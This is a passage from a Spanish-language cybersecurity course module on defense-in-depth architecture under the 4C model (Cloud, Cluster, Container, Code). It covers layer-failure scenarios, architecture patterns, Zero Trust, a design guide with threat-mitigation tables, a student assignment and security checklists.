│  ════ CLUSTER ════                                              │
│  5. Ingress Controller recibe request                           │
│  6. Network Policy permite tráfico al pod del API Gateway       │
│  7. ServiceAccount del pod tiene permisos mínimos               │
│  8. mTLS verifica identidad entre servicios                     │
│         │                                                       │
│         ▼                                                       │
│  ════ CONTAINER ════                                            │
│  9. Container ejecuta como usuario no-root                      │
│  10. Filesystem es read-only (excepto /tmp)                     │
│  11. CPU/Memory limits previenen abuso                          │
│  12. Health check verifica que el container está sano           │
│         │                                                       │
│         ▼                                                       │
│  ════ CODE ════                                                 │
│  13. API Gateway valida JWT del usuario                         │
│  14. RBAC verifica que el usuario puede acceder a /usuarios     │
│  15. Input validation sanitiza parámetros                       │
│  16. Query parametrizada ejecuta en la BD                       │
│  17. Resultado se retorna al usuario                            │
│  18. Request se loguea en SIEM (sin datos sensibles)            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 9.3 Qué pasa si una capa falla

```
┌─────────────────────────────────────────────────────────────────┐
│                  FALLA DE CAPA - ESCENARIOS                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Escenario A: WAF mal configurado (falla CLOUD)                 │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  Atacante envía SQL injection → WAF no bloquea           │  │
│  │  PERO: Network Policy limita comunicación (CLUSTER)      │  │
│  │  PERO: Container read-only limita escritura (CONTAINER)  │  │
│  │  PERO: Query parametrizada previene inyección (CODE)     │  │
│  │  → Ataque fallido                                        │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                 │
│  Escenario B: Vulnerabilidad en librería (falla CODE)           │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  Atacante explota CVE en dependencia                     │  │
│  │  PERO: Container no-root limita privilegios (CONTAINER)  │  │
│  │  PERO: Network Policy bloquea salida (CLUSTER)           │  │
│  │  PERO: Security Group no permite acceso externo (CLOUD)  │  │
│  │  → Daño limitado, sin exfiltración posible               │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                 │
│  Escenario C: Container escape (falla CONTAINER)                │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  Atacante sale del container al host                     │  │
│  │  PERO: RBAC limita qué puede hacer (CLUSTER)             │  │
│  │  PERO: Security Groups limitan red (CLOUD)               │  │
│  │  PERO: Code no tiene credenciales hardcodeadas (CODE)    │  │
│  │  → Movimiento lateral limitado                           │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 10. Patrones Arquitectónicos

### 10.1 Patrón: Monolito (4C)

```
┌─────────────────────────────────────────────────────────┐
│  MONOLITO CON MODELO 4C                                 │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  CLOUD:                                                 │
│  ├── VM en AWS/Azure                                    │
│  ├── Security Group restrictivo                         │
│  └── WAF + DDoS                                         │
│                                                         │
│  CLUSTER: N/A (un solo servidor)                        │
│  └── Pero: Systemd services + isolation                 │
│                                                         │
│  CONTAINER:                                             │
│  ├── Docker con app + DB en contenedores separados      │
│  └── Docker Compose para orquestación simple            │
│                                                         │
│  CODE:                                                  │
│  ├── Aplicación completa en un repositorio              │
│  ├── Input validation, queries parametrizadas           │
│  └── Secrets en variables de entorno                    │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 10.2 Patrón: Microservicios (4C)

```
┌─────────────────────────────────────────────────────────┐
│  MICROSERVICIOS CON MODELO 4C                           │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  CLOUD:                                                 │
│  ├── VPC con subnets públicas/privadas                  │
│  ├── Load Balancer + API Gateway                        │
│  └── Service Mesh (Istio/Linkerd) para mTLS             │
│                                                         │
│  CLUSTER:                                               │
│  ├── Kubernetes con múltiples namespaces                │
│  ├── RBAC por namespace                                 │
│  ├── Network Policies entre servicios                   │
│  └── Pod Security Standards                             │
│                                                         │
│  CONTAINER:                                             │
│  ├── Imágenes escaneadas en CI/CD                       │
│  ├── Sidecar containers (logging, monitoring)           │
│  └── Init containers para setup                         │
│                                                         │
│  CODE:                                                  │
│  ├── Cada servicio con su propia seguridad              │
│  ├── API contracts validados                            │
│  ├── Circuit breakers para resiliencia                  │
│  └── Observabilidad (traces, metrics, logs)             │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 10.3 Patrón: Serverless (4C)

```
┌─────────────────────────────────────────────────────────┐
│  SERVERLESS CON MODELO 4C                               │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  CLOUD:                                                 │
│  ├── API Gateway como entrada                           │
│  ├── IAM roles por función                              │
│  └── WAF en API Gateway                                 │
│                                                         │
│  CLUSTER: N/A (managed por proveedor)                   │
│  └── Pero: configuraciones del proveedor                │
│                                                         │
│  CONTAINER: N/A (managed por proveedor)                 │
│  └── Pero: limits de memoria/tiempo                     │
│                                                         │
│  CODE:                                                  │
│  ├── Funciones stateless                                │
│  ├── Mínimo privilegio por función                      │
│  ├── Secrets en Secret Manager                          │
│  └── Validación en cada función                         │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

## 11. Zero Trust con Modelo 4C

### 11.1 Zero Trust aplicado a cada capa

```
┌─────────────────────────────────────────────────────────────────┐
│              ZERO TRUST EN MODELO 4C                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ═══════ CLOUD ═══════                                          │
│  │ "Nunca confíes en la red"                                    │
│  │                                                              │
│  │ - Toda conexión requiere autenticación                       │
│  │ - Security Groups deny all por defecto                       │
│  │ - mTLS entre todos los servicios                             │
│  │ - IAM con MFA obligatorio                                    │
│  │ - Conditional Access basado en riesgo                        │
│                                                                 │
│  ═══════ CLUSTER ═══════                                        │
│  │ "Nunca confíes en el namespace"                              │
│  │                                                              │
│  │ - Network Policies: default deny                             │
│  │ - RBAC: mínimo privilegio por ServiceAccount                 │
│  │ - Admission Controllers validan cada deploy                  │
│  │ - Audit logs de todas las acciones                           │
│                                                                 │
│  ═══════ CONTAINER ═══════                                      │
│  │ "Nunca confíes en el container"                              │
│  │                                                              │
│  │ - No root, read-only filesystem                              │
│  │ - Drop ALL capabilities                                      │
│  │ - Imágenes escaneadas antes de deploy                        │
│  │ - Runtime security (Falco, Sysdig)                           │
│                                                                 │
│  ═══════ CODE ═══════                                           │
│  │ "Nunca confíes en el input"                                  │
│  │                                                              │
│  │ - Validar todos los inputs                                   │
│  │ - Sanear todos los outputs                                   │
│  │ - Autenticar cada request (JWT)                              │
│  │ - Autorizar cada acción (RBAC/ABAC)                          │
│  │ - Logs de todas las operaciones                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 12. Diseñar tu Propia Arquitectura (Guía Práctica)

### 12.1 Paso 1: Entender los Requisitos

```
Antes de diseñar, responde:

┌─────────────────────────────────────────────────────────┐
│  Pregunta                    │ Ejemplo                  │
├──────────────────────────────┼──────────────────────────┤
│  ¿Qué protege?               │ App web de e-commerce    │
│  ¿Qué datos maneja?          │ Personales, pago         │
│  ¿Cuántos usuarios?          │ 10,000 concurrentes      │
│  ¿Disponibilidad?            │ 99.9%                    │
│  ¿Compliance?                │ PCI-DSS, GDPR            │
│  ¿Presupuesto?               │ Medio (cloud optimizado) │
│  ¿Modelo 4C aplicable?       │ Sí → Cloud + K8s + Docker│
└──────────────────────────────┴──────────────────────────┘
```

### 12.2 Paso 2: Identificar Activos por Capa

```
┌─────────────────────────────────────────────────────────┐
│  CAPA         │ ACTIVOS A PROTEGER                      │
├───────────────┼─────────────────────────────────────────┤
│  CLOUD        │ VPC, Security Groups, S3 Buckets, IAM   │
│  CLUSTER      │ API Server, etcd, Namespaces, RBAC      │
│  CONTAINER    │ Imágenes, secrets del runtime, volumes  │
│  CODE         │ Código fuente, BD credentials, API keys │
└───────────────┴─────────────────────────────────────────┘
```

### 12.3 Paso 3: Modelar Amenazas por Capa (STRIDE + 4C)

| Capa | Amenaza | Mitigación |
|------|---------|------------|
| **CLOUD** | S3 bucket público | Block public access, bucket policy |
| **CLOUD** | IAM role sobre-permisionado | Mínimo privilegio, access analyzer |
| **CLUSTER** | API server expuesto | Private endpoint, CIDR restrictivo |
| **CLUSTER** | Pod con privilegios | PodSecurity, OPA policies |
| **CONTAINER** | Imagen vulnerable | Trivy scan en CI/CD |
| **CONTAINER** | Container como root | USER directive, runAsNonRoot |
| **CODE** | SQL Injection | Parameterized queries |
| **CODE** | Secrets hardcodeados | Vault, env variables |

### 12.4 Paso 4: Diseñar con 4C

```
Ejemplo: Propuesta de Arquitectura E-Commerce

═══════ CLOUD ═══════
├── VPC con subnets públicas y privadas
├── CloudFront (CDN) + WAF
├── Application Load Balancer
├── Security Groups:
│   ├── ALB: solo 443 desde 0.0.0.0/0
│   ├── Nodes: solo desde ALB
│   └── RDS: solo desde Nodes
├── IAM:
│   ├── Roles por servicio
│   ├── MFA en cuentas admin
│   └── Access Analyzer activo
└── Logging: CloudTrail + VPC Flow Logs

═══════ CLUSTER ═══════
├── EKS (Kubernetes managed)
├── Namespaces: frontend, backend, database, monitoring
├── RBAC: ServiceAccount por servicio
├── Network Policies:
│   ├── Default deny en todos los namespaces
│   ├── Frontend → Backend: solo 8080
│   └── Backend → Database: solo 5432
├── Ingress: Nginx con TLS
├── Secrets: cifrados en etcd, External Secrets Operator
└── Monitoring: Prometheus + Grafana + AlertManager

═══════ CONTAINER ═══════
├── Imágenes:
│   ├── Base: python:3.11-slim
│   ├── Escaneadas con Trivy en CI/CD
│   └── Push a ECR con tag de versión
├── Runtime:
│   ├── runAsNonRoot: true
│   ├── readOnlyRootFilesystem: true
│   ├── capabilities: drop ALL
│   └── resources: limits y requests
└── Health checks: liveness + readiness

═══════ CODE ═══════
├── Autenticación: OAuth 2.0 + JWT
├── Autorización: RBAC por endpoint
├── Input: validación con Pydantic
├── Output: escaping para XSS
├── Database: queries parametrizadas
├── Secrets: AWS Secrets Manager
├── Dependencies: safety check en CI/CD
└── Logging: JSON estructurado, sin PII
```

### 12.5 Paso 5: Documentar

Crear un documento con:

1. **Diagrama de arquitectura** (como el de arriba)
2. **Flujo de datos** (cómo viaja la información por las 4C)
3. **Puntos de seguridad por capa** (qué protege cada capa)
4. **Controles de acceso** (quién puede acceder a qué, en cada capa)
5. **Plan de recuperación** (qué hacer si algo falla en cada capa)

### 12.6 Paso 6: Validar

| Verificación | Pregunta | Respuesta esperada |
|-------------|----------|-------------------|
| Cloud | ¿Hay WAF + DDoS? | Sí |
| Cloud | ¿Security Groups restrictivos? | Sí, deny by default |
| Cluster | ¿RBAC configurado? | Sí, mínimo privilegio |
| Cluster | ¿Network Policies? | Sí, default deny |
| Container | ¿Imágenes escaneadas? | Sí, en CI/CD |
| Container | ¿No-root + read-only? | Sí |
| Code | ¿Input validation? | Sí, en todos los endpoints |
| Code | ¿Secrets seguros? | Sí, en Vault/Secret Manager |

---

## 13. Tarea 2: Propuesta de Arquitectura

### 13.1 Instrucciones

Proponer una arquitectura de seguridad para un sistema real usando el **Modelo 4C**.

### 13.2 Formato de Entrega

```
PROPUESTA DE ARQUITECTURA - [Nombre del Sistema]

1. DESCRIPCIÓN DEL SISTEMA
   - ¿Qué hace el sistema?
   - ¿Qué datos maneja?
   - ¿Cuántos usuarios?
   - ¿Requisitos de compliance?

2. DIAGRAMA DE ARQUITECTURA
   - Diagrama visual (draw.io, Lucidchart, etc.)
   - Mostrar las 4 capas

3. CAPA CLOUD
   - Proveedor cloud elegido
   - Configuración de red
   - Firewalls/Security Groups
   - IAM y gestión de identidad
   - Logging y monitoreo

4. CAPA CLUSTER
   - Tecnología de orquestación
   - Configuración de RBAC
   - Network Policies
   - Gestión de Secrets
   - Monitorización

5. CAPA CONTAINER
   - Imágenes base elegidas
   - Configuración de seguridad
   - Escaneo de vulnerabilidades
   - Resource limits

6. CAPA CODE
   - Lenguaje/framework
   - Controles de seguridad
   - Gestión de dependencias
   - Gestión de secrets

7. ANÁLISIS DE AMENAZAS
   - Top 5 amenazas identificadas
   - Mitigación por capa

8. CHECKLIST
   - Checklist de cada capa completado
```

### 13.3 Criterios de Evaluación

| Criterio | Puntos |
|----------|--------|
| Modelo 4C aplicado correctamente | 25% |
| Seguridad en cada capa documentada | 25% |
| Diagrama claro y completo | 15% |
| Análisis de amenazas | 15% |
| Checklist completado | 10% |
| Creatividad y viabilidad | 10% |

---

## 14. Checklist de Arquitectura

### 14.1 Checklist CLOUD

| # | Control | Cumple |
|---|---------|--------|
| 1 | VPC con subnets públicas/privadas | ☐ |
| 2 | Security Groups restrictivos | ☐ |
| 3 | WAF activo | ☐ |
| 4 | DDoS protection | ☐ |
| 5 | IAM con mínimo privilegio | ☐ |
| 6 | MFA en cuentas admin | ☐ |
| 7 | CloudTrail / audit logs | ☐ |
| 8 | Cifrado en reposo (KMS) | ☐ |

### 14.2 Checklist CLUSTER

| # | Control | Cumple |
|---|---------|--------|
| 9 | API Server con TLS y auth | ☐ |
| 10 | RBAC configurado | ☐ |
| 11 | Network Policies (default deny) | ☐ |
| 12 | Secrets cifrados en etcd | ☐ |
| 13 | Pod Security Standards | ☐ |
| 14 | Audit logs del API Server | ☐ |
| 15 | Namespace isolation | ☐ |
| 16 | Admission controllers | ☐ |

### 14.3 Checklist CONTAINER

| # | Control | Cumple |
|---|---------|--------|
| 17 | Imagen escaneada (Trivy) | ☐ |
| 18 | Base mínima (slim/alpine) | ☐ |
| 19 | No ejecutar como root | ☐ |
| 20 | Read-only root filesystem | ☐ |
| 21 | Drop ALL capabilities | ☐ |
| 22 | CPU/Memory limits | ☐ |
| 23 | Health checks | ☐ |
| 24 | Tag específico (no latest) | ☐ |

### 14.4 Checklist CODE

| # | Control | Cumple |
|---|---------|--------|
| 25 | Input validation | ☐ |
| 26 | Output encoding (XSS) | ☐ |
| 27 | Parameterized queries | ☐ |
| 28 | Secrets en Vault/env | ☐ |
| 29 | Auth + MFA + JWT | ☐ |
| 30 | Dependencies escaneadas | ☐ |
| 31 | Error handling seguro | ☐ |
| 32 | Logging sin PII | ☐ |

---

## 15. Referencias

### 15.1 Frameworks y Estándares

| Recurso | Descripción | URL |
|---------|-------------|-----|
| **NIST SP 800-190** | Container Security Guide | https://csrc.nist.gov/publications/detail/sp/800-190 |
| **CIS Kubernetes Benchmark** | Hardening de K8s | https://www.cisecurity.org/benchmark/kubernetes |
| **OWASP Kubernetes Cheat Sheet** | Seguridad en K8s | https://cheatsheetseries.owasp.org |
| **NIST Zero Trust** | Guía Zero Trust | https://csrc.nist.gov/publications/detail/sp/800-207 |
| **MITRE ATT&CK for Containers** | Técnicas en contenedores | https://attack.mitre.org/matrices/enterprise/containers |

### 15.2 Herramientas

| Herramienta | Uso | URL |
|-------------|-----|-----|
| **Trivy** | Escaneo de imágenes | https://github.com/aquasecurity/trivy |
| **Falco** | Runtime security | https://falco.org |
| **OPA/Gatekeeper** | Políticas en K8s | https://www.openpolicyagent.org |
| **Kyverno** | Políticas K8s nativas | https://kyverno.io |
| **Draw.io** | Diagramas | https://app.diagrams.net |

### 15.3 Recursos de Aprendizaje

| Recurso | Tipo | URL |
|---------|------|-----|
| **Kubernetes Security** | Libro (Liz Rice) | https://kubernetes-security.info |
| **Container Security** | Libro (Liz Rice) | https://containersecurity.tech |
| **AWS Well-Architected** | Framework | https://aws.amazon.com/architecture/well-architected |
| **Azure Architecture** | Patrones | https://learn.microsoft.com/azure/architecture |

---

## Apéndice: Imágenes de Referencia

> Las siguientes imágenes de referencia están disponibles en la carpeta:
> `Recursos/Arquitectura_Imagenes/`
>
> Para agregar imágenes, colócalas en esa carpeta y referencia su nombre aquí.

---

*Documento creado exclusivamente con fines educativos. Parte del curso de ciberseguridad.*
